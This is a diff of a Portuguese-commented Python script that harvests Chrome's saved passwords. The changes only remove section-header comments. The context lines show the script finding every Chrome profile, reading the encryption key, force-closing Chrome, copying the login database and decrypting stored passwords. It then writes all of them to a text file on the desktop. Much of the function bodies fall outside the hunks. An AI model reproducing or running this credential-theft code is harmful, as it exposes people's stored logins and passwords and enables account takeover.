@@ -10,7 +10,6 @@ import psutil
 import ctypes
 import traceback
 
-# ------------------- FUNÇÕES DE UTILIDADE -------------------
 def get_desktop_path():
     print("[DEBUG] Obtendo o caminho da área de trabalho.")
     csidl_desktop = 0x0010
@@ -21,7 +20,6 @@ def get_desktop_path():
 OUTPUT_FILE_PATH = os.path.join(get_desktop_path(), "senhaseloginschrome.txt")
 TEMP_DB_FILE = "temp_ChromePasswords.db"
 
-# ------------------- FUNÇÕES DE PERFIL DO CHROME -------------------
 def get_profile_name(profile_path):
     print(f"[DEBUG] Obtendo o nome do perfil para '{profile_path}'")
     preferences_path = os.path.join(profile_path, "Preferences")
@@ -38,7 +36,6 @@ def get_profile_name(profile_path):
         print(f"[ERROR] Erro ao decodificar JSON do arquivo 'Preferences': {json_error}")
         return "Perfil Desconhecido"
 
-# ------------------- FUNÇÕES DE CHAVE DE CRIPTOGRAFIA -------------------
 def get_key(keypath):
     print(f"[DEBUG] Obtendo a chave de criptografia do arquivo '{keypath}'")
     try:
@@ -65,7 +62,6 @@ def get_key(keypath):
         traceback.print_exc()
     return None
 
-# ------------------- FUNÇÃO DE DESCRIPTOGRAFIA -------------------
 def password_decryption(password, encryption_key):
     print("[DEBUG] Descriptografando a senha")
     try:
@@ -89,7 +85,6 @@ def password_decryption(password, encryption_key):
                 traceback.print_exc()
     return "Sem senhas"
 
-# ------------------- FUNÇÕES DE MANIPULAÇÃO DE PROCESSOS -------------------
 def close_chrome():
     print("[DEBUG] Forçando o fechamento dos processos do Chrome")
     for proc in psutil.process_iter(['pid', 'name']):
@@ -116,7 +111,6 @@ def remove_temp_file():
             attempts += 1
             time.sleep(2)
 
-# ------------------- FUNÇÃO PARA EXTRAIR CREDENCIAIS -------------------
 def get_credt(dbpath, keypath, profile_name):
     print(f"[DEBUG] Extraindo credenciais do banco de dados '{dbpath}'")
     credentials_found = False
@@ -165,7 +159,6 @@ def get_credt(dbpath, keypath, profile_name):
             collected_info.append(f"Perfil: {profile_name}\nNenhuma senha ou login encontrado.\n")
     return collected_info
 
-# ------------------- FUNÇÃO PRINCIPAL PARA PROCESSAR PERFIS -------------------
 def process_profiles():
     print("[DEBUG] Iniciando o processamento dos perfis do Chrome")
     root_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
@@ -201,7 +194,6 @@ def process_profiles():
     else:
         print(f"[DEBUG] Arquivo não criado. Verifique por erros.")
 
-# ------------------- EXECUÇÃO -------------------
 try:
     process_profiles()
 except Exception as e:
